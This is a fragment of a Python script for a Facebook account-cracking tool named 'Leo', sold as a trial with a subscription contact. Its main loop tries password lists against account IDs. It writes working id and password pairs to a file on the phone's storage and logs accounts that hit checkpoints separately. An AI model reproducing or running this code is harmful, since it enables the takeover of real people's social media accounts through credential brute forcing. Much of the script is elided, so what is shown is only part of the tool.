...
expiry_time =datetime.strptime('''2024-3-10 00:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('''[🥶!🥶] توقفت الاداة تواصل مع المطور @L1466 للاشتراك''')
    exit(0)
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Github    : BANTUBD
 Facebook  : SADIK KHAN
 Tool Name : \033[1;36m𝙇𝙚𝙤🇦🇷\033[1;37m
 Tool Type : \033[1;31mTRIAL\033[1;37m
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/Leo•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [Leo•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/Leo•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
